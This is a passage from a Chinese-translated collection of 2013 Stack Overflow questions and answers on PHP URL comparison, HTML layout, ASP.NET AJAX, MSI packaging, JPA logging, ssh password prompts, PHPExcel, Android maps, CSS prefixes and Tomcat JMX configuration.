$similarRecords = array_intersect(array_map("parseURLs", $array1), array_map("parseURLs", $array2));
print_r($similarRecords);

function parseURLs($strURL) {
  $parts = parse_url($strURL);
  return $parts['host'];
} 
```

输出是：

```
Array ( [0] => example.com [3] => stackoverflow.com ) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T10:05:52.907

试试这个：

```
function domain($n){
    $url = parse_url($n);
    return $url['host'];
}

$array1 = array("http://example.com/abc","http://google.com/xyz","http://yahoo.com/abc", "http://stackoverflow.com/mnr");
$array2 = array("http://example.com/xyz","http://w3schools.com/xyz","http://stackoverflow.com/abc");

$similarRecords = array_intersect(array_map("domain", $array1), array_map("domain", $array2));

echo "<pre>";
print_r($similarRecords); 
```

输出 ：

```
Array
(
    [0] => example.com
    [3] => stackoverflow.com
) 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-01T10:13:31.330

您可以使用similar_text 进行比较。唯一的问题是可比性因素似乎是任意的。

```
<?php
$array1 = array("http://example.com/abc","http://google.com/xyz","http://yahoo.com/abc", "http://stackoverflow.com/mnr");
$array2 = array("http://example.com/xyz","http://w3schools.com/xyz","http://stackoverflow.com/abc");
print_r($array1);
print_r($array2);
echo "\n";

foreach ($array1 as $slice)
{
        foreach ($array2 as $slice2)
        {
                echo 'Comparing '.$slice.' to '.$slice2.' gives comparability of '.similar_text($slice,$slice2)."\n";
                if (similar_text($slice,$slice2) > 18)
                {
                        echo $slice.' ____is similar to___ '.$slice2."\n";
                }
        }
}
?> 
```

输出：

```
Comparing http://example.com/abc to http://example.com/xyz gives comparability of 19
http://example.com/abc ____is similar to___ http://example.com/xyz
Comparing http://example.com/abc to http://w3schools.com/xyz gives comparability of 13
Comparing http://example.com/abc to http://stackoverflow.com/abc gives comparability of 17
Comparing http://google.com/xyz to http://example.com/xyz gives comparability of 17
Comparing http://google.com/xyz to http://w3schools.com/xyz gives comparability of 18
Comparing http://google.com/xyz to http://stackoverflow.com/abc gives comparability of 14
Comparing http://yahoo.com/abc to http://example.com/xyz gives comparability of 13
Comparing http://yahoo.com/abc to http://w3schools.com/xyz gives comparability of 15
Comparing http://yahoo.com/abc to http://stackoverflow.com/abc gives comparability of 18
Comparing http://stackoverflow.com/mnr to http://example.com/xyz gives comparability of 14
Comparing http://stackoverflow.com/mnr to http://w3schools.com/xyz gives comparability of 16
Comparing http://stackoverflow.com/mnr to http://stackoverflow.com/abc gives comparability of 25
http://stackoverflow.com/mnr ____is similar to___ http://stackoverflow.com/abc 
```

因此，您可以将匹配项放在一个数组中并在之后输出。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-01T10:00:00.570

您可能会使用 array_search() 或 array_uintersect() 循环遍历一个数组并在另一个数组上进行松散搜索，或者使用回调 strpos 的 uintersect

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-04T08:13:15.247

多亏了这一切，我终于做到了。

```
<?php
$array1 = array("http://example.com/abc","http://google.com/xyz","http://yahoo.com/abc", "http://stackoverflow.com/mnr");
$array2 = array("http://example.com/xyz","http://w3schools.com/xyz","http://stackoverflow.com/abc");
echo "<pre>";
print_r($array1);
echo "<br/>";
print_r($array2);
echo "<br/>";
$similarRecords = similarRecords($array1, $array2);
print_r($similarRecords);
echo "</pre>";
function getDomain($strURL)
{
    $url = parse_url($strURL);
    return $url['host'];
}

function similarRecords($array1, $array2)
{
    $similarRecords = array();
    foreach ($array1 as $slice)
    {
        foreach ($array2 as $slice2)
        {
            if (getDomain($slice) == getDomain($slice2))
            {
                $similarRecords[] = $slice; 
                $similarRecords[] = $slice2; 
            }
        }
    }

    return $similarRecords;
}
?> 
```

# html - 网页顶部的间隙。Dreamweaver 上没有显示间隙

> ID：15154881
> 
> 赞同：1
> 
> 时间：2013-03-01T09:54:46.630
> 
> 标签：html

我有点难过。

在我的网站上，它显示标题和导航栏之间有一点差距。我不知道为什么或如何摆脱它。

[www.elite-arcades.com](http://www.elite-arcades.com)

任何人都可以帮忙吗？

继承人的代码：

```
 <!--new header section ends -->

        <tr>
            <td>
              <img src="layout/eliteheader.jpg" alt="Elite Gaming | The UK's Premier Arcade Machine Supplier" width="900" height="235" />                  </td>
        </tr>

 <!-- Navigation Menu Begins -->

    <tr bordercolor="#000000">
    <td background="layout/background1.gif">
        <div id="Navigation" style="PADDING-BOTTOM: 0px; PADDING-LEFT: 50px; PADDING-RIGHT: 50px; PADDING-TOP: 0px;"> 
```

和CSS：

```
body {
color:#333333;
font-family: Verdana, Arial, Helvetica, sans-serif;
font-size: 12px;
font-style: normal;
font-weight: normal;
text-decoration: none;
margin: 0;
padding: 0; 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:12:01.310

这是因为您已在以下行中`cellspacing`设置为：`28`

```
<table cellpadding="0" cellspacing="28" width="100%"> 
```

您需要将其设置为 0 并检查它是否对页面布局的其他部分没有任何影响。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T10:32:16.517

使用 `vertical-align:top` 下面的精英标题图像，问题将得到解决。

```
<img style="vertical-align: top" width="900" height="236" alt="Elite Gaming | The UK's Premier Arcade Machine Supplier" src="layout/eliteheader.jpg"> 
```

# jquery - 向 ASP.NET WebMethod 调用 jQuery AJAX 调用时出错

> ID：15154887
> 
> 赞同：0
> 
> 时间：2013-03-01T09:55:06.860
> 
> 标签：jquery, asp.net, ajax

我必须对 ASP.NET WebMethod 进行 ajax 调用。我为此编写了以下代码，并通过在成功和错误函数中添加警报来测试 ajaxcall 是否正常工作。我收到警报作为错误并且不能找到我哪里出错了。

这是我的代码

```
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js">
<script type="text/javascript">
$(document).ready(function() {
    $.ajax({
        type: "POST",
        contentType: "application/json; charset=utf-8",
        url: "Multiple_Markers.aspx/BindAddress",
        data: "{}",
        dataType: "json",
        success: function(data) {
           alert("success")
        },
        error: function(result) {
            alert("Error");
        }
    });
});
</script> 
```

这是我在 Multiple_Markers.aspx 页面中编写的 webmethod。webmethod 运行良好。

```
[WebMethod]
public static OrganizationBAL[] BindAddress()
{
    DataTable dt = new DataTable();
    List<OrganizationBAL> lstAddress = new List<OrganizationBAL>();
    ProgramDAL clsPgmDAL=new ProgramDAL();

    using (SqlConnection sqlcon = new SqlConnection(clsPgmDAL.connStr))
    {
        string str="select street_address as title,latitude as lat,longitude as lng,"+
                   "street_address+','+city+','+state+','+country as descritpion from dbo.tblOrganization_Address";
        using (SqlCommand cmd = new SqlCommand(str, sqlcon))
        {
            sqlcon.Open();
            SqlDataAdapter sqlad = new SqlDataAdapter(cmd);
            sqlad.Fill(dt);
            foreach (DataRow dRow in dt.Rows)
            {
                OrganizationBAL clsOrg = new OrganizationBAL();
                clsOrg.CITY = dRow["title"].ToString();
                clsOrg.LATITUDE = dRow["lat"].ToString();
                clsOrg.LONGITUDE = dRow["lng"].ToString();
                clsOrg.ADDRESS_TYPE_LOCATION = dRow["descritpion"].ToString();
                lstAddress.Add(clsOrg);
            }
        }
    }
    return lstAddress.ToArray();
} 
```

我为实现上述结果而编写的网络服务。但问题仍然存在。

```
 [WebMethod]
[ScriptMethod(ResponseFormat=ResponseFormat.Json)]
public OrganizationBAL[] BindAddress()
{
    DataTable dt = new DataTable();
    List<OrganizationBAL> lstAddress = new List<OrganizationBAL>();
    ProgramDAL clsPgmDAL = new ProgramDAL();

    using (SqlConnection sqlcon = new SqlConnection(clsPgmDAL.connStr))
    {
        string str = "select street_address as title,latitude as lat,longitude as lng," +
                   "street_address+','+city+','+state+','+country as descritpion from dbo.tblOrganization_Address";
        using (SqlCommand cmd = new SqlCommand(str, sqlcon))
        {
            sqlcon.Open();
            SqlDataAdapter sqlad = new SqlDataAdapter(cmd);
            sqlad.Fill(dt);
            foreach (DataRow dRow in dt.Rows)
            {
                OrganizationBAL clsOrg = new OrganizationBAL();
                clsOrg.CITY = dRow["title"].ToString();
                clsOrg.LATITUDE = dRow["lat"].ToString();
                clsOrg.LONGITUDE = dRow["lng"].ToString();
                clsOrg.ADDRESS_TYPE_LOCATION = dRow["descritpion"].ToString();
                lstAddress.Add(clsOrg);
            }
        }
    }
    return lstAddress.ToArray();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T10:26:34.607

确保您在 web 方法之前在 web 服务中添加了以下行

```
[System.Web.Script.Services.ScriptService] 
```

我建议您创建一个 ASMX 文件以使用 Web 服务。它很容易使用。创建一个 Web 服务，然后确保在 Web 方法之前在 Web 服务中添加上述行，并将 Web 方法写入 Web 服务中。

还要编辑这个网址：

```
url: "Multiple_Markers.aspx/BindAddress", 
```

而不是 Multiple_Markers.aspx 页面，您应该编写您的 Web 服务名称。它可能会帮助你。

# asp.net - 如何为 ASP.Net 网站创建 MSI 安装程序包？

> ID：15154892
> 
> 赞同：1
> 
> 时间：2013-03-01T09:55:22.643
> 
> 标签：asp.net, c#-4.0

如何为 ASP.Net 网站创建 MSI 安装程序包？

谁能帮我一个好的链接？

大多数文章只是介绍了 Windows 应用程序的解决方案。

我通过使用添加部署项目得到此错误：合并程序集 aspnet_merge 时。在部署项目中。 [http://codeissue.com/articles/a04df930da62eb1/create-asp-net-deployment-package-using-web-deployment-and-web-setup-project](http://codeissue.com/articles/a04df930da62eb1/create-asp-net-deployment-package-using-web-deployment-and-web-setup-project)

错误：错误 35 合并程序集时发生错误：ILMerge.Merge：错误！！：在程序集“App_Web_4fgmsrtw”中发现重复类型“SatmapSkillReport”。项目部署 aspnet_merge 1 1

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-01T10:24:41.893

这实际上是可能的，但请注意我的经验是使用 Visual Studio 2008。我没有在 Visual Studio 2010 或 2012 上尝试过。

1.  在VS2008中，点击`File`>>`Add``New Project`
2.  在`Add New Project`对话框中，选择`Other Project Types`> `Setup and Deployment`>`Web Setup Project`
3.  从那里您可以在解决方案资源管理器中右键单击项目，然后单击`View`以查看用户界面、启动条件、注册表设置等，或在`Properties`中设置虚拟目录名称。您还可以包含要部署的任何项目或主项目的输出文件。

如果您正确配置并构建该项目，则输出是一个 MSI 安装程序文件。当您使用此 MSI 安装程序文件时，您可以使用`Add/Remove Programs`(win xp) 或`Programs and Features`(win7)。

我想您可以设置 DNS、权限、运行数据库创建脚本，并提供各种可能的配置。

[一个很好的指南，这里有很多截图](http://dataerror.blogspot.com/2010/06/creating-web-setup-project-for-aspnet.html)

**更新**

[Web部署项目在VS2012中不可用](https://stackoverflow.com/questions/11229582/will-web-deployment-projects-still-be-available-in-visual-studio-2012)

[Web部署项目在VS2010中可用](https://stackoverflow.com/questions/5524634/how-to-create-a-web-setup-project-in-vs-2010-for-a-mvc2-application)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-07-15T04:38:15.020

我自己找到了解决方案。！

你可以关注链接。

**[1]:[之后无法重命名 MSI](https://stackoverflow.com/questions/17542919/cant-rename-msi-afterwards)**

并寻求帮助：

**[2]：[https ://www.simple-talk.com/dotnet/visual-studio/updates-to-setup-projects/](https://www.simple-talk.com/dotnet/visual-studio/updates-to-setup-projects/)**

# ios - 带有异议的XIB中的依赖注入

> ID：15154895
> 
> 赞同：0
> 
> 时间：2013-03-01T09:55:33.290
> 
> 标签：ios, objective-c, interface-builder, ioc-container, xib

我正在尝试使用依赖注入框架“ [Objection](https://github.com/atomicobject/objection) ”动态更改我的 xib 文件所有者。如果您不知道异议，请了解我只想动态更改我的 xib 文件所有者。

让我举个例子。
当我启动我的应用程序时，我将“MainMenuBlue”类的分配绑定到“MainMenu”类

> [self bindBlock:^(JSObjectionInjector *context) {
>         return [[MainMenuBlue alloc] init] autorelease];
> } toClass:[MainMenu 类]];

根据我的配置，我有时将其绑定到“MainMenuRed”或“MainMenuYellow”等...

问题显然是我的 xib 文件所有者是“MainMenu”，所以它创建了一个“MainMenu”。
是不是很奇怪？:-)
你知道将 xib 链接到好的控制器的优雅方法吗？无需将 MainMenu.xib 复制到 MainMenuBlue.xib、MainMenuRed.xib、MainMenuYellow.xib

我相信这将不可能使用 xib 文件，所以我将不得不远离界面生成器......

重要提示：
这只是说明我的需要的一个例子。当然在现实中我不只是改变背景颜色。

**编辑：**
感谢 Jasper Blues 我发现了。实际上，我创造了一个不是真正的问题。
根据我的配置，我只需要这样做：

> [[MainMenuBlue alloc] initWithNibName:@"MainMenu" bundle:nil];

或者

> [[MainMenuRed alloc] initWithNibName:@"MainMenu" bundle:nil];

马丁马加基安

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:11:34.177

文件所有者中指定的类无关紧要，只要它响应与运行时提供的类相同的消息即可。即文件的所有者只是作为一个接口来连接你的连接。

当您进行绑定时，请务必使用 initWithNibName:bundle:

# sql - 使用 Batoo JPA 启用 SQL 日志记录

> ID：15154897
> 
> 赞同：0
> 
> 时间：2013-03-01T09:55:38.390
> 
> 标签：sql, jpa, batoo

如何使用 Batoo JPA 启用 SQL 日志记录

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:25:43.833

您可以通过以下方式启用它

```
log4j.logger.org.batoo.jpa.core.SQL=DEBUG 
```

在您的 log4j.properties 文件中

或者不处理记录器并将属性传递给persistance.xml，以将sql日志重定向到STD_OUT或STD_ERR，如示例所示；

```
<persistence xmlns="http://java.sun.com/xml/ns/persistence"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/persistence 
    http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd" version="2.0">

<persistence-unit name="default">
    <provider>org.batoo.jpa.core.BatooPersistenceProvider</provider>

    <class>org.batoo.jpa.core.test.simple.Foo</class>

    <exclude-unlisted-classes>true</exclude-unlisted-classes>
    <properties>
        <property name="org.batoo.jpa.ddl" value="DROP" />
        <!--org.batoo.jpa.sql_logging :: NONE | STDOUT | STDERR -->
        <property name="org.batoo.jpa.sql_logging" value="STDERR" />
    </properties>

</persistence-unit> 
```

但是将 log4j 启​​用到 DEBUG 级别会将查询参数值记录为奖励，这比问号更好。

# shell - 隐藏在 shell 脚本中的密码

> ID：15154899
> 
> 赞同：2
> 
> 时间：2013-03-01T09:55:46.310
> 
> 标签：shell

我已经创建了一个如下所示的 shell 脚本。我需要隐藏密码，当脚本提示时我会给出密码。如果我在本地机器的单引号内运行以下脚本，它将隐藏密码。但如果我添加 SSH 部分，它不会。

我应该怎么做才能隐藏密码？

> ```
> ssh root@10.3.2.0 'echo -n Password:;
> read -s password;
> echo;
> echo $password;
> ' 
> ```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T10:16:28.583

尝试使用`-t`ssh 选项来强制分配 tty。

```
ssh -t root@10.3.2.0 'echo -n Password:;
read -s password;
echo;
echo $password;' 
```

编辑：建议解决方案的解释

如果不运行登录会话而只是一个命令，默认情况下 SSH 不会为正在运行的进程分配伪终端设备。这种行为并不是一个错误，而是故意选择的。

这样就可以在不同机器之间传递未经解释的二进制数据。也许是这样的：

```
ssh whoever@wherever 'cat remote_file' | local_program 
```

如果数据被中间的终端驱动程序过滤，那么以这种方式在两台机器之间传递数据几乎是不可能的——想想你必须关心的大量转义序列！

如果没有分配任何终端，就无法隐藏用户输入。任何尝试都`stty something`将失败，因为根本没有任何终端！

要让 ssh 分配一个伪终端，即使没有在登录会话中运行，您也必须传递`-t`参数来强制分配 tty。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:59:19.290

最好使用 ssh 密钥，这样，无需借助`ssh-agent`. 查看一个很好的方法：[https ://wiki.archlinux.org/index.php/SSH_Keys](https://wiki.archlinux.org/index.php/SSH_Keys)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T12:09:27.860

I am new to scripts, though I guess this might can help you :

```
#!/bin/sh

echo -n "Enter Password : "
stty -echo
read password < /dev/tty
stty echo
echo
echo -n "Enter Password again : "
stty -echo
read password1 < /dev/tty
stty echo
echo
echo "Password Entered are : $password and $password1" 
```

# php - 在 PHPExcel 中设置方向表

> ID：15154903
> 
> 赞同：7
> 
> 时间：2013-03-01T09:55:57.610
> 
> 标签：php, phpexcel

我试图将我的数据库数据导出到 excel 文件，所以我使用 PHPExcel 类。

我的工作表应该是从右到左，如何在 PHPExcel 中将工作表方向切换为“RTL”？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-03-01T09:58:37.953

直接从开发者文档中引用，可以在发行版的 /Documentation 文件夹中找到：

> **4.6.48。从右到左的工作表**
> 
> 可以单独设置工作表，无论“A”列应该从左侧还是右侧开始。默认为左。这是从右到左设置列的方法。

```
// right-to-left worksheet
$objPHPExcel->getActiveSheet()
    ->setRightToLeft(true); 
```

# android - Google Maps Android API v2 - 添加标记失败

> ID：15154906
> 
> 赞同：1
> 
> 时间：2013-03-01T09:56:07.513
> 
> 标签：android, google-maps, google-maps-markers

我找到了解决方案。地图可能尚未初始化，请在生命周期的后期尝试 getMap()，例如 onResume()

我的代码是

```
 protected void onResume() {
        super.onResume();
        int resultCode = GooglePlayServicesUtil.isGooglePlayServicesAvailable(getApplicationContext());
        if (resultCode == ConnectionResult.SUCCESS){
            Toast.makeText(getApplicationContext(),
                    "isGooglePlayServicesAvailable SUCCESS",
                    Toast.LENGTH_LONG).show();

            if(gMap == null){
                gMap = mMapView.getMap();
                if(gMap != null){
                    gMap.setMyLocationEnabled(true);
                    gMap.setMapType(GoogleMap.MAP_TYPE_HYBRID);
                }else{
                    Toast.makeText(getApplicationContext(),
                            "cannot getMap!",
                            Toast.LENGTH_LONG).show();
                }
            }

        }else{
            GooglePlayServicesUtil.getErrorDialog(resultCode, this, RQS_GooglePlayServices);
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-06-16T09:44:02.720

试试这个来添加自定义标记：

```
public void placingCurrentMarkerWithBalloon(String address)
    {
        LatLng current_latlng = new LatLng(cur_lat, cur_lng);
        gMapview.addMarker(new MarkerOptions().position(current_latlng)
                    .title("Address")
                    .snippet(address)
.icon(BitmapDescriptorFactory.fromResource(R.drawable.person_marker))
/*.icon(BitmapDescriptorFactory.defaultMarker())*/
).showInfoWindow();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T10:06:01.427

编辑您已完成以下步骤：

```
Add Play Services Library in project :  
 Eclipse > import > Android > Existing Android code in to workspace  
 Browse you SDK path like ~/android-sdk-linux/extras/google/google_play_services  
 import that project in to workspace 
```

将上述库项目添加到您的项目中。**仅在Android 设备**中运行，不在**模拟器中运行**

这是简单的检查下面的代码：

```
 import android.os.Bundle;  
 import android.support.v4.app.FragmentManager;  
 import com.actionbarsherlock.app.SherlockFragmentActivity;  
 import com.google.android.gms.maps.GoogleMap;  
 import com.google.android.gms.maps.GoogleMap.OnMapClickListener;  
 import com.google.android.gms.maps.SupportMapFragment;  
 import com.google.android.gms.maps.model.LatLng;  
 import com.google.android.gms.maps.model.MarkerOptions;

public class MainActivity extends Activity {  
      private GoogleMap MAP;  
      @Override  
      protected void onCreate(Bundle arg0) {  
           // TODO Auto-generated method stub  
           //setTheme(R.style.Theme_Sherlock);  
           super.onCreate(arg0);  
           setContentView(R.layout.activity_main);  
           FragmentManager myFM = getSupportFragmentManager();  
           SupportMapFragment myMAPF = (SupportMapFragment) myFM  
                     .findFragmentById(R.id.fragment1);  
           MAP = myMAPF.getMap();  
           MAP.setMyLocationEnabled(true);  
           MAP.setMapType(GoogleMap.MAP_TYPE_HYBRID);  
           MAP.setOnMapClickListener(new OnMapClickListener() {  
                @Override  
                public void onMapClick(LatLng point) {  
                     // TODO Auto-generated method stub  
                     MAP.addMarker(new MarkerOptions().position(point).title(  
                               point.toString()));  
                }  
           });  
      }  
 } 
```

更详细的检查：[点击](http://dj-android.blogspot.in/2013/02/android-google-map-v2-part-2.html)这里和[点击这里](http://dj-android.blogspot.in/2013/02/android-google-map-v2-part-3-add.html)

根据您的代码检查：

```
Marker marker = map.add(new MarkerOptions()
           .position(new LatLng(37.7750, 122.4183))
           .title("San Francisco")
           .snippet("Population: 776733"));

   gMap.addMarker(marker); 
```

# css - 为什么css命令在浏览器中不同

> ID：15154907
> 
> 赞同：1
> 
> 时间：2013-03-01T09:56:20.793
> 
> 标签：css

我最近一直在检查**css3 命令**。**为什么它们中的一些在每个浏览器中都不同？**

例如，看一下[这个 2D 变换示例](http://www.w3schools.com/css3/css3_2dtransforms.asp)

```
div
{
transform: rotate(30deg);
-ms-transform: rotate(30deg); /* IE 9 */
-webkit-transform: rotate(30deg); /* Safari and Chrome */
-o-transform: rotate(30deg); /* Opera */
-moz-transform: rotate(30deg); /* Firefox */
} 
```

如果他们都接受相同的论点，为什么他们会让他们变得不同？他们是否处于某种测试阶段？**它们会永远相同**（在测试阶段之后）吗？

如果您考虑[这个动画示例](http://www.w3schools.com/css3/css3_animations.asp)，这是非常**不切实际的**

```
@keyframes myfirst
{
from {background: red;}
to {background: yellow;}
}

@-moz-keyframes myfirst /* Firefox */
{
from {background: red;}
to {background: yellow;}
}

@-webkit-keyframes myfirst /* Safari and Chrome */
{
from {background: red;}
to {background: yellow;}
}

@-o-keyframes myfirst /* Opera */
{
from {background: red;}
to {background: yellow;}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:01:09.793

事实上，它们并不总是接受相同的参数或行为方式相同。

也就是说，为什么要加上前缀，直到有某种标准或共同的理解这个属性应该如何表现以及它的语法应该如何。

其中一些属性只是实验性的。浏览器供应商有一个很酷的新想法并将其添加到其浏览器中。一段时间后，其他浏览器供应商可能会采用它，但再过一段时间，就会有此功能的标准。

大多数时候，在某些浏览器版本之后，这些前缀都会被删除，因此您可以使用标准前缀。例如：一开始有一个前缀[and`border-radius`](http://caniuse.com/#feat=border-radius)`-moz-`，`-webkit-`但在属性定义稳定后，前缀被删除了，现在你可以使用无前缀的版本。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T10:05:16.857

要回答这个问题 - 是的，它们通常表示 beta 实现。一旦特定属性被标准化并且浏览器供应商添加了 ant 无前缀版本，他们通常会将前缀版本保留为别名并在以后弃用它。另外，是的，一旦标准化，行为应该是相同的（除非有意外的错误！）

CSS 供应商特定的扩展是规范的[一部分](http://www.w3.org/TR/CSS21/syndata.html#vendor-keywords)。浏览器供应商使用它们向他们的浏览器添加未经批准或非标准化的 CSS 功能。理解是每个浏览器中的功能很可能不同，并且当无前缀规则标准化时，它可能不是最终功能。

CSS 供应商前缀[不太受欢迎](http://www.quirksmode.org/blog/archives/2010/03/css_vendor_pref_1.html)，尽管有一些[有用的方法](http://css-tricks.com/how-to-deal-with-vendor-prefixes/)可以以更简洁的方式处理它们，避免您强调的问题。

# intuit-partner-platform - 断开与 Intuit 应用中心的连接

> ID：15154910
> 
> 赞同：-3
> 
> 时间：2013-03-01T09:56:34.020
> 
> 标签：intuit-partner-platform, intuit

断开应用程序与 Intuit 应用程序中心的连接时，我们遇到了问题。当我们断开连接时，我们的断开连接 servlet 被调用，但参数为空。从论坛中我们了解到，断开连接的登陆 URL 应该启用 OpenID 以获取诸如 realmId、用户名之类的信息。在我们的例子中，我们没有实现 OpenId，因为我们不想在 Intuit App Center 中发布。那么我们如何在与 Intuit App center 断开连接时获取断开连接公司的 realmID 等详细信息。在与 Intuit 应用中心断开连接时，是否可以在不实施 OpenId 的情况下获取这些详细信息？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T16:37:18.780

领域 id、电子邮件和用户名仅通过 AX 或 SREG 参数提供。如果未实现 OpenID，您将无法检索这些值。

# tomcat7 - Tomcat 7.0.33 JAVA_OPTS 配置

> ID：15154919
> 
> 赞同：1
> 
> 时间：2013-03-01T09:57:03.720
> 
> 标签：tomcat7, jmx, remote-access

我想使用 JMX 通过远程连接来监控 tomcat 和 ActiveMQ。

对于activeMQ，我在startup.bat的JAVA_OPTS中添加了这个：

```
JAVA_OPTS=
-Dwebconsole.type=properties \
-Dwebconsole.jms.url=tcp://localhost:61616 \
-Dwebconsole.jmx.url=service:jmx:rmi:///jndi/rmi://localhost:1099/ jmxrmi 
```

当我启动 tomcat 服务器和 ActiveMQ 时，在 Jconsole 中我可以连接到 url：

```
service:jmx:rmi:///jndi/rmi://x.x.x.x:1099/jmxrmi 
```

对于tomcat监控，我添加了：

```
-Dcom.sun.management.jmxremote ^
-Dcom.sun.management.jmxremote.port=9004 ^
-Dcom.sun.management.jmxremote.ssl=false ^
-Dcom.sun.management.jmxremote.authenticate=false ^
-Djava.rmi.server.hostname=x.x.x.x 
```

然后，当我尝试连接到`service:jmx:rmi:///jndi/rmi://x.x.x.x:9004/jmxrmi`Jconsole 中的 url 时，连接失败。我尝试使用 Netbeans（他似乎使用 catalina.bat 而不是 startup.bat）并将 java_opts 从 startup.bat 移动到 catalina.bat，并在我启动服务器时将日志移至此处：

```
'-Dcom.sun.management.jmxremote' n'est pas reconnu en tant que commande interne
Using CATALINA_BASE:   "C:\Program Files\apache-tomcat-7.0.33"
Using CATALINA_HOME:   "C:\Program Files\apache-tomcat-7.0.33"
Using CATALINA_TMPDIR: "C:\Program Files\apache-tomcat-7.0.33\temp"
Using JRE_HOME:        "C:\Program Files\Java\jdk1.7.0_07"
Using CLASSPATH:       "C:\Program Files\apache-tomcat-7.0.33\bin\bootstrap.jar;C:\Program Files\apache-tomcat-7.0.33\bin\tomcat-juli.jar"
ou externe, un programme ex‚cutable ou un fichier de commandes.
'-Dcom.sun.management.jmxremote' n'est pas reconnu en tant que commande interne
ou externe, un programme ex‚cutable ou un fichier de commandes. 
```

对不起法语的东西，重要的部分说 -Dcom.sun.management.jmxremote 不能识别为内部或外部命令。

Jconsole 调试输出：

```
java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.ServiceUnavailableException [Root exception is java.rmi.ConnectException: Connection refused to host: 192.168.117.31; nested exception is: 
    java.net.ConnectException: Connection refused: connect]
    at javax.management.remote.rmi.RMIConnector.connect(RMIConnector.java:357)
    at javax.management.remote.JMXConnectorFactory.connect(JMXConnectorFactory.java:267)
    at javax.management.remote.JMXConnectorFactory.connect(JMXConnectorFactory.java:226)
    at sun.tools.jconsole.ProxyClient.tryConnect(ProxyClient.java:354)
    at sun.tools.jconsole.ProxyClient.connect(ProxyClient.java:314)
    at sun.tools.jconsole.VMPanel$2.run(VMPanel.java:295)
Caused by: javax.naming.ServiceUnavailableException [Root exception is java.rmi.ConnectException: Connection refused to host: 192.168.117.31; nested exception is: 
    java.net.ConnectException: Connection refused: connect]
    at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:118)
    at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:203)
    at javax.naming.InitialContext.lookup(InitialContext.java:411)
    at javax.management.remote.rmi.RMIConnector.findRMIServerJNDI(RMIConnector.java:1924)
    at javax.management.remote.rmi.RMIConnector.findRMIServer(RMIConnector.java:1891)
    at javax.management.remote.rmi.RMIConnector.connect(RMIConnector.java:274)
    ... 5 more
Caused by: java.rmi.ConnectException: Connection refused to host: 192.168.117.31; nested exception is: 
    java.net.ConnectException: Connection refused: connect
    at sun.rmi.transport.tcp.TCPEndpoint.newSocket(TCPEndpoint.java:619)
    at sun.rmi.transport.tcp.TCPChannel.createConnection(TCPChannel.java:216)
    at sun.rmi.transport.tcp.TCPChannel.newConnection(TCPChannel.java:202)
    at sun.rmi.server.UnicastRef.newCall(UnicastRef.java:340)
    at sun.rmi.registry.RegistryImpl_Stub.lookup(Unknown Source)
    at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:114)
    ... 10 more
Caused by: java.net.ConnectException: Connection refused: connect
    at java.net.DualStackPlainSocketImpl.connect0(Native Method)
    at java.net.DualStackPlainSocketImpl.socketConnect(DualStackPlainSocketImpl.java:69)
    at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:339)
    at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:200)
    at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:182)
    at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:157)
    at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:391)
    at java.net.Socket.connect(Socket.java:579)
    at java.net.Socket.connect(Socket.java:528)
    at java.net.Socket.<init>(Socket.java:425)
    at java.net.Socket.<init>(Socket.java:208)
    at sun.rmi.transport.proxy.RMIDirectSocketFactory.createSocket(RMIDirectSocketFactory.java:40)
    at sun.rmi.transport.proxy.RMIMasterSocketFactory.createSocket(RMIMasterSocketFactory.java:146)
    at sun.rmi.transport.tcp.TCPEndpoint.newSocket(TCPEndpoint.java:613)
    ... 15 more 
```

我将 activeMQ 部分留在了 startup.bat 中，我仍然可以连接到它。我真的不知道问题出在哪里......如果有人可以帮助我

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T09:21:31.603

我终于解决了问题，现在可以将 jConsole 连接到端口 9004。这是我配置 catalina.bat 的方式：

```
set CATALINA_OPTS=-Dcom.sun.management.jmxremote=true -Dcom.sun.management.jmxremote.port=9004 -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false -Djava.rmi.server.hostname=x.x.x.x 
```

没有“输入”，没有引号，我指定`true`了第一个参数，并且全部都在一个 CATALINA_OPTS 声明中。

希望它可以有用

# jquery - Jquery使用if for css单击显示隐藏按钮

> ID：15154923
> 
> 赞同：4
> 
> 时间：2013-03-01T09:57:08.823
> 
> 标签：jquery, click, hide, show

我一直在尝试制作一个按钮来切换另一个 div 的可见性......这是我正在使用的 JavaScript

```
$(document).ready(function () {
    var navwidth = $('div#navigationpanel').css('max-width');

    $('div#showhidenav').click(function () {
